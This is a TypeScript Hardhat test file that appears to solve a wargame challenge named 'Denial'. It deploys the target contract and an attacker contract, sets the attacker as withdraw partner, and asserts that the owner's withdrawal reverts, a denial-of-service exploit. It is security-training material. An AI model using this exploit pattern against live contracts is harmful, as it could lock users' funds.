import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Denial";
const ATTACKER_NAME = "DenialAttacker";

describe(CONTRACT_NAME, () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let attackerContract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [owner, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy();
    await contract.deployed();

    await owner.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther("0.001"),
    });

    const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
    attackerContract = await attackerFactory.connect(attacker).deploy(contract.address);
    await attackerContract.deployed();

    contract = contract.connect(attacker);
    attackerContract = attackerContract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    tx = await contract.setWithdrawPartner(attackerContract.address);
    await tx.wait();

    tx = contract.connect(owner).withdraw({ gasLimit: 1000000 });
    await expect(tx).to.be.reverted;
  });
});
